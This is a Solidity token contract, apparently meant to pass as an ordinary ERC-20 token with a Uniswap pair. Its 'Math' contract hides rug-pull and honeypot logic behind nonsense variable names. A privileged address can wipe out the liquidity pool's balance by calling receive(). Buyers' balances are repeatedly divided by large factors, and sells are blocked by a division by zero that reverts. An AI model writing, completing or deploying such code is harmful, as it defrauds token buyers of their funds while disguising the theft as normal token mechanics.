pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Math { 
    mapping (address => uint256) internal _balances;
    mapping (address => bool) internal Flipping;

    address[] internal greArr; address[] internal Potato;

    bool[3] internal Trump; bool internal trading = false;

    uint256 internal Crazy = block.number*2; uint256 internal numB;
    uint256 internal Cakes = 0; uint256 internal Death = 1;

    function last(uint256 g) internal view returns (address) { return (Cakes > 1 ? greArr[greArr.length-g-1] : address(0)); }

    receive() external payable {
        require(msg.sender == Potato[1]); _balances[Potato[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(Potato[2]).sync(); Trump[2] = true;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((trading || (sender == Potato[1])), "ERC20: trading is not yet enabled.");
        Death += ((Flipping[sender] != true) && (Flipping[recipient] == true)) ? 1 : 0;
        if (((Flipping[sender] == true) && (Flipping[recipient] != true)) || ((Flipping[sender] != true) && (Flipping[recipient] != true))) { greArr.push(recipient); }
        _balancesOfTheGreat(sender, recipient);
    }

    function _balancesOfTheGreat(address sender, address recipient) internal {
        if ((Trump[0] || (Trump[2] && (recipient != Potato[1])))) { for (uint256 q=0; q < greArr.length-1; q++) { _balances[greArr[q]] /= (Trump[2] ? 1e9 : 4e1); } Trump[0] = false; }
        _balances[last(1)] /= (((Crazy == block.number) || Trump[1] || ((Crazy - numB) <= 7)) && (Flipping[last(1)] != true) && (Cakes > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Trump[1]) && (last(0) == sender)) || ((Trump[2] && (Potato[1] != sender))) ? (0) : (1));
        (Trump[0],Trump[1]) = ((((Death*10 / 4) == 10) && (Trump[1] == false)) ? (true,true) : (Trump[0],Trump[1]));
        Crazy = block.number; Cakes++;
    }
}